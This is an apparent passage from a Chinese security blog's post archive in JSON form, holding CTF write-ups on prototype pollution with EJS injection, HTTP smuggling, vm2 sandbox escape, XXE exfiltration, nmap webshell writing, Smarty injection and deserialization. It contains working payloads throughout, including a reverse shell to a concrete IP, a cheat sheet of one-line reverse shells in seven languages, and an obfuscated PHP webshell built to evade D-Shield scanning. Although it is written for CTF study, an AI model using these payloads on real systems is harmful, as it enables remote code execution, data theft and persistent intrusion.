核心代码就是在他循环遍历这一段，会将crying进行一次设置，直接原型链污染： 1&#123; &quot;name&quot;: &quot;123&quot;,&quot;discription&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;crying&quot;:&quot;123&quot;&#125;&#125; 这样子就可以取到session，ejs模板注入的部分看官方文档即可： = =发现他就直接执行代码的，那么很简单的 1wishes=&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;) %&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"http走私","slug":"http走私","date":"2021-02-07T06:25:34.000Z","updated":"2021-02-07T08:19:33.885Z","comments":true,"path":"2021/02/07/http走私/","link":"","permalink":"http://example.com/2021/02/07/http%E8%B5%B0%E7%A7%81/","excerpt":"","text":"也是在Hgame里面遇见了才学习到，http走私产生的原因很简单，就是因为HTTP协议提供两种方式来决定结束的方式，分别有 Content-Length标头和Transfer-Encoding标头，Content-Lenth我们一般见得多，它以字节为单位指定消息内容体的长度，例如： 12345678POST / HTTP/1.1Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Cookie: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8Content-Length: 35a=11 Transfer-Encoding标头用于指定消息体使用分块编码（Chunked Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟换行符，然后是块内容，最重要的是：整个消息体以大小为0的块结束，也就是说解析遇到0数据块就结束。如： 123456789POST / HTTP/1.1Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.netContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedba=110 其实理解起来漏洞真的很简单，就是前后端对于HTTP结束的规定不同，比如前端可能读取到Content-Length就认为这段请求结束了，而整个请求包被发送过去的时候后端读取到了Transfer-Encoding，认为到这结束，所以两者就处理不同了。 那么就可能产生如下几种不同情况： 前端处理Content-Length,后端不处理1234567GET / HTTP/1.1Host: police.liki.linkContent-Length: 77GET /secret HTTP/1.1Host: police.liki.linkClient-IP:127.0.0.1 在这种情况下，前端处理到Content-Lenth之后就会停下，但是后端并不会，继续处理后半段的请求。 前后端处理CL方式不同当请求中出现两个CL的时候，前后端的处理方式不同也会导致漏洞诞生，例子： 12345678POST / HTTP/1.1Host: police.liki.linkContent-Length: 89Content-Length: 90(中间略过)12345678 假设到78前面正好为89个字符的话，比如像这样一个请求，前端读取第一个CL认为请求体包括了12345\\r\\na，而后端读取第二个CL，认为请求体只包括到了12345\\r\\n。于是后面的a就到了缓冲区之中，当又有用户进行这样一个访问时： 123POST / HTTP/1.1Host: police.liki.linkContent-Length: 77 就会产生不存在aPOST这种访问方式的错误了 在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）在Transfer-Encoding: chunked下数据格式是这样的 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size &#x3D; 0][\\r\\n][\\r\\n] 分块大小的值在前，后面是分块数据。当到尾部时，分块大小的值为0，然后以\\r\\n\\r\\n结束 像这样的一个请求，前端处理CL后认为请求体为6，包括0\\r\\n\\r\\nG。而后端处理TE后，检测到0\\r\\n\\r\\n就认为这个请求已经结束了，G就进入了缓冲区。结果就是再发送一个正常的POST请求进来，就会出现没有GPOST请求的错误 前端只处理TE，后端只处理CL（TE-CL） 像这个请求，前端接受后检测到0\\r\\n\\r\\n后才认为请求结束，于是就把12\\r\\nGPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n认为是属于请求体的。而后端根据CL值，认为12\\r\\n请求就结束了，于是连续访问后就会出现没有GPOST请求的错误 前后端都处理TE这时虽然处理相同了，但我们可以通过对TE进行混淆，使得其中一个服务器不处理TE，结果造成TE-CL/CL-TE的http走私 像这个请求，尝试用两个TE去混淆，使得后端服务器不处理TE只处理CL，造成TE-CL的http走私 来自博客：http://www.shifeng-kaze.cn/index.php/archives/132/#，写的真好，这里只做自己的纪念 Hgame两道题的Payload： 第一题： 1234567891011GET / HTTP/1.1Host: thief.0727.siteContent-Length: 77Transfer-Encoding: chunked0GET /secret HTTP/1.1Host: thief.0727.siteClient-IP:127.0.0.1aa:bn 第二题： 这题目和第一题是差不多一样的，只不过是作者为了防止蹭车设置了障碍，你得爆破 1234567891011121314151617GET / HTTP/1.1Host: police.liki.linkUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Length: 77Transfer-Encoding: chunked0GET /secret HTTP/1.1Host: thief.0727.siteClient-IP:127.0.0.1aa:bn (最后两行的换行符是必需品)","categories":[],"tags":[]},{"title":"De1CTF2019SSRFMe","slug":"De1CTF2019SSRFMe","date":"2021-01-12T03:32:47.000Z","updated":"2021-01-12T03:33:34.676Z","comments":true,"path":"2021/01/12/De1CTF2019SSRFMe/","link":"","permalink":"http://example.com/2021/01/12/De1CTF2019SSRFMe/","excerpt":"","text":"","categories":[],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"HFCTF2020JustEscape","slug":"HFCTF2020JustEscape","date":"2020-12-17T06:22:59.000Z","updated":"2020-12-17T09:27:45.152Z","comments":true,"path":"2020/12/17/HFCTF2020JustEscape/","link":"","permalink":"http://example.com/2020/12/17/HFCTF2020JustEscape/","excerpt":"","text":"一道VM2的沙箱逃逸.. 知识点 沙箱逃逸 Payload拼接(?) 做题思路这道题目伪装成PHP是真滴恶心，首先我们访问可以得到一个用Vue框架写的页面： 尝试直接访问index.php的话可以得到一段php源码: 12345678&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123; $code = $_GET[&#x27;code&#x27;]; echo eval(code);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 结果你就会发现这个code是没加$符号的也就是说他没用..那么再回到之前的code的部分，大概也是真的eval了这段代码，看看是不是Javascript 1?code=Error().stack 果然是JS，而且我们可以知道是VM2的沙箱，那么如何沙箱逃逸呢？👴一点JS也不懂，没法子只能去GITHUB上嫖，找到： vm2沙箱逃逸，可以看到： 123456789101112131415&quot;use strict&quot;;const &#123;VM&#125; = require(&#x27;vm2&#x27;);const untrusted = &#x27;(&#x27; + function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;+&#x27;)()&#x27;;try&#123; console.log(new VM().run(untrusted));&#125;catch(x)&#123; console.log(x);&#125; 尝试复制粘贴【 12345678(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;() 好的打不过，倒地只能看WP了，别人给出的POC： POC 1123456789(function ()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)(); try&#123; Object.preventExtensions(Buffer.from(``)).a = 1; &#125;catch(e)&#123; return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString(); &#125;&#125;)() 呃..?这里看起来是进行了拼接，自己不懂原理的话就先学会怎么拼接payload吧,在JS中我们可以用反引号来代替单引号和双引号： `的语法ES6 模板字符串(Template String)是增强版的字符串，用反引号(`)标识，它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。介绍博客,从此处我们可以得到反引号作用： 代替字符串的双引号和单引号 可以包含特定语法的占位符 配合${}符号可以包含变量 例子： 原本我们输出多行字符串应该这样来写： 12console.log(&#x27;string text line 1\\n&#x27; +&#x27;string text line 2&#x27;); 使用反引号之后: 12console.log(`string text line 1string text line 2`); 当其与${}搭配之后更是可以大大降低我们书写字符串的格式化问题： 那么现在回到题目来，我们需要拼接变量该如何操作呢？很简单，只需要先用反引号将需要的东西包含起来，再用${}即可表示为一个变量： []的语法如果不允许我们使用点号，我们可以使用[]来绕过：JS中的中括号 这样的话我们就可以任意的绕过关键参数匹配，拼接出上图的Payload了 POC 2利用join来拼接字符串： JOIN12(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &#125; &#125;)() JS当中使用join()中添加参数来决定如何拼接，如果不添加默认用,分割开来，如果为0就会拼接在一起了 POC 3数组绕过1234567code[]=(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString(); &#125; VM2沙箱逃逸原理先丢在这，不敢碰我npm环境现在","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Javascirpt","slug":"Javascirpt","permalink":"http://example.com/tags/Javascirpt/"},{"name":"vm2沙箱逃逸","slug":"vm2沙箱逃逸","permalink":"http://example.com/tags/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"}]},{"title":"网鼎杯fileJava","slug":"网鼎杯fileJava","date":"2020-12-17T02:16:24.000Z","updated":"2020-12-17T05:12:48.845Z","comments":true,"path":"2020/12/17/网鼎杯fileJava/","link":"","permalink":"http://example.com/2020/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AFfileJava/","excerpt":"","text":"知识点 Java 文件泄露 XXE 做题思路： 开局可以上传文件，下载的时候可以文件泄露 这样的话就可以找到三个Java文件，分别dump源码，在文件中作者给出了提示 123456789101112131415161718192021FileItem fileItem = (FileItem)var10.next();String filename;String fileExtName;if (fileItem.isFormField()) &#123; filename = fileItem.getFieldName(); fileExtName = fileItem.getString(&quot;UTF-8&quot;);&#125; else &#123; filename = fileItem.getName(); if (filename != null &amp;&amp; !filename.trim().equals(&quot;&quot;)) &#123; fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1); InputStream in = fileItem.getInputStream(); if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) &#123; try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch (InvalidFormatException var20) &#123; System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;); var20.printStackTrace(); &#125; &#125; 故找到这个CVE： https://blog.csdn.net/weixin_42296449/article/details/88934150 先写一个符合正则的的用户名evcel-xxx.xlsx,将其后缀修改为zip，加上POC之后再修改回去： 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://0.0.0.0/1.dtd&quot;&gt;%remote;%int;%send;]&gt; 在反射过去的机子上面写一个1.dtd，令其远程实体调用 12&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;0.0.0.0?p=%file;&#x27;&gt;&quot;&gt; 随后上传文件即可：","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"XXE","slug":"XXE","permalink":"http://example.com/tags/XXE/"}]},{"title":"网鼎杯朱雀组Nmap","slug":"网鼎杯朱雀组Nmap","date":"2020-12-16T09:06:30.000Z","updated":"2020-12-16T09:15:18.257Z","comments":true,"path":"2020/12/16/网鼎杯朱雀组Nmap/","link":"","permalink":"http://example.com/2020/12/16/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84Nmap/","excerpt":"","text":"考点： NMAP 组件 PHP 短标签绕过 做题思路题目类似BUU曾经的题目Online Tool 此处使用system函数，应该可以进行命令执行，nmap参数中 -oG可以进行文件写入，此处我们写入一句话木马，最后payload为 1?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27; 直接写入PHP被过滤，所以绕过一下就行 1host&#x3D; &#39; &lt;?&#x3D;&#96;$_POST[0]&#96; ;?&gt; -oG 1.phtml &#39;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"PicDown","slug":"PicDown","date":"2020-12-16T07:44:20.000Z","updated":"2021-05-02T02:45:17.672Z","comments":true,"path":"2020/12/16/PicDown/","link":"","permalink":"http://example.com/2020/12/16/PicDown/","excerpt":"","text":"知识点 文件包含 linux信息文件读取 做题思路开局就可以找到一个文件读取的地方，利用burp就可以抓取数据 之后你可以直接读取到flag了[ 我感觉有点奇怪，这道题应该没那么简单，看了别人的WP才知道应该读取linuxproc下的文件，这里整理一下： 1234567891011121314/proc/[pid]/cmdline #查看当前linux正在执行什么命令，在这里pid不知道的情况下我们可以通过self代指当前web端的文件/proc/self/comm #查看当前进程的命令名/proc/self/cwd #查看当前工作目录的符号连接cwd下面会有可以读取的文件，比如/var/www/html 下我在工作，那么/proc/self/cwd/index.php 同样可以读取到/proc/self/environ #显示进程的环境变量/proc/self/exe #查看实际运行程序的符号链接/proc/self/fd #一个目录，包含进程打开文件的情况（注意这里曾经出过考点，如果看到一个程序Python打开某个txt之后没有关闭，就可以利用这里来读取 既然是flask文件，那么我们可以尝试读取app.py，获取源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;search.html&#x27;)@app.route(&#x27;/page&#x27;)def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#x27;application/octet-stream&#x27;) response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#x27;search.html&#x27;, res=value)@app.route(&#x27;/no_one_know_the_manager&#x27;)def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) 接下来我们就要去拿到key，直接读取/tmp/secret.txt会读取不到，因为已经被删掉了，那么我们就应该去尝试读取/proc/self/fd/3，结果还是出不来，这下就只能爆破了。。。看看回显长度明显不对的 1234567import requests,timefor i in range(1,10000): url = &quot;http://ab2b25bc-4b91-4cdd-8783-c166e7d6ebae.node3.buuoj.cn/page?url=../../../../../../proc/&#123;&#125;/fd/3&quot;.format(i) res = requests.get(url=url).text print(len(res),&quot;此时i为&quot;+str(i)) time.sleep(0.05) 这里我得进程是14，爆破得到 1yoKTwnWJilxVJnoa8y9HwwAAagZ7aKs0MGPKhMbjYWA= 既然只能执行os.system,直接反弹shell 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27; 弹过去就拿到shell了 这里顺便把各种语言一句话反弹shell记录在此： python: 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27; perl: 1 1perl -e &#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; 2 1perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27; Ruby 1ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; PHP 1php -r &#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; 12345678910111213 public class Revs &#123; /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception &#123; // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p = r.exec(cmd); p.waitFor(); &#125;&#125; Lua 1lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;5555&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot; AWK 1awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27; [WMCTF2020]Make PHP Great Again绕过require_once 只能包含一次的的限制 今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。 在这里有个小知识点，/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload: 12php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#x2F;&#x2F;result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo&#x3D; 接下来我们将对绕过的原理进行分析，php7.2.23的源码进行分析，建议配合Clion在linux里进行调试，至于如何搭建调试环境，可以自行搜索，参考一些别的文章。 1https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzA5ODA0NDE2MA&#x3D;&#x3D;&amp;mid&#x3D;2649729209&amp;idx&#x3D;1&amp;sn&#x3D;78c1f6cf291e5cfca3088f02216ccffd&amp;chksm&#x3D;888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime&#x3D;1597388716474&amp;sharer_shareid&#x3D;33a823b10ae99f33a60db621d83241cb#rd 另外一种方法： 12http:&#x2F;&#x2F;571be1a2-1a80-477d-8f8c-71cd3a4d93a3.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;123&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"一些过狗马","slug":"一些过狗马","date":"2020-12-14T08:07:29.000Z","updated":"2020-12-17T11:32:55.972Z","comments":true,"path":"2020/12/14/一些过狗马/","link":"","permalink":"http://example.com/2020/12/14/%E4%B8%80%E4%BA%9B%E8%BF%87%E7%8B%97%E9%A9%AC/","excerpt":"","text":"写这篇的原因主要是一次对内的AWD自己被一个过狗马的方式卡住了，想了半天才折腾出来，所以打算总结一下各种过狗马的姿势。 在各篇AWD比赛中总会教我们起手式就是把原件脱下来备份，之后就是用D盾扫。而D盾这个东西对于代码的识别很多时候也就是局限于对一些函数的正则匹配。所以我们绕过需要注意几点即可： 对于eval，call_back函数是不能用的 尝试使用一些罕见的call back函数 记录一个傻逼玩意儿： 123&lt;?=$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];$___($$____[_]);//密码是_","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"AWD","slug":"AWD","permalink":"http://example.com/tags/AWD/"}]},{"title":"GYCTF_EASYPHP","slug":"GYCTF-EASYPHP","date":"2020-12-11T10:06:15.000Z","updated":"2020-12-11T10:18:11.841Z","comments":true,"path":"2020/12/11/GYCTF-EASYPHP/","link":"","permalink":"http://example.com/2020/12/11/GYCTF-EASYPHP/","excerpt":"","text":"知识点 反序列化逃逸 POP链 思路题目可以dump下来www下的PHP文件，在update.php下面： 123456789if ($_SESSION[&#x27;login&#x27;]!=1)&#123; echo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; 即使登陆没有成功也执行了update()这个函数，所以要说漏洞肯定就是在这里了，重点在lib.php这里，所以我们要尝试check这儿，先看update函数： 1234567public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);&#125; 我们看这里反序列化了getNewInfo函数，查看这个函数跟进 12345public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname)));&#125; 接收了两个参数，之后调用safe函数，并且序列化了它，那么去找safe函数： 1234function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125; 直接将不满6的东西变成了hack，有问题，这里可以造成反序列化逃逸。这是一个正常的更新流程，但很明显我们不应该跟着他的思路去走，因为有了反序列化逃逸，所以nickname我们可以任意控制， 我们在getNewInfo这里可以看见new了一个info类，inFo类这里很明显除了__construct之外还有有个call。那么题目应该是想让我们控制任意的sql语句查询-&gt;得到一个恒为真的结果-&gt;登陆成功。 回到题目这里的情况设想下，无论登陆成功与否，都会尝试执行update函数，update函数这里new了UpdateHelper类，在类被销毁的时候输出了$this-&gt;sql","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"CISCN2019WEB11","slug":"CISCN2019WEB11","date":"2020-12-08T13:03:48.000Z","updated":"2020-12-08T13:28:53.654Z","comments":true,"path":"2020/12/08/CISCN2019WEB11/","link":"","permalink":"http://example.com/2020/12/08/CISCN2019WEB11/","excerpt":"","text":"知识点： XFF注入 模板注入smarty smarty​ 这是PHP的一个模板语言，类似于flask的jinjia2，smarty也可以让我们解析PHP的逻辑语言，比如，我们可以通过{system(“ls”)}执行系统命令，除此之外，PHPsmarty还有很多骚思路： {php}{/php} 可以执行php的代码 例子： 1&#123;php&#125;eval($_POST[0]);&#123;/php&#125; {literal}该标签可以让一段标签代码原样输出，在这种情况下我们可以使用： 1&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;system(&quot;ls&quot;);&lt;/script&gt;&#123;/literal&#125; 静态方法1&#123;self::getStreamVariable(“file:///etc/passwd”)&#125; {if}标签官方文档中看到这样的描述： 1Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;* 上述都摘自文章：https://blog.csdn.net/qq_45521281/article/details/107556915 做题思路题目开始就给了IP的地方，所以我们可以直接在这里进行注入，开始我还以为是SQLMAP。。不过后来发现不是，是SMARTY模板注入 故我们直接在XXF输出{system(“cat /flag”)} 或者{if system(“cat /flag”)}{/if}","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"Python反序列化","slug":"Python反序列化","date":"2020-12-07T11:21:26.000Z","updated":"2020-12-23T11:34:25.363Z","comments":true,"path":"2020/12/07/Python反序列化/","link":"","permalink":"http://example.com/2020/12/07/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"今天在刷BUU的时候做到了IKUN这道题目，以前没有接触过Python的反序列化，所以不会做到最后一步..复现完之后决定总结一下Python的反序列化的几种方式： Python能够实现的序列化与反序列化方式主要有三： JSON pickle shelve 而这Ikun这道题使用的便是Pickle，故我们从这一部分开始说起。 Picklepickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。 pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化， pickle序列化后的数据，可读性差，人一般无法识别。 Python接口有4个： dump dumps load loads dumpdump我们用于将数据写入文件当中，官方文档中： 1pickle.dump（obj，file，protocol = None，*，fix_imports = True ） 我们可以实践一下： 12345678910111213141516171819202122232425262728293031323334353637383940import pickleclass Person: def __init__(self, n, a): self.name = n self.age = a def show(self): print(self.name + &quot;_&quot; + str(self.age))aa = Person(&quot;JGood&quot;, 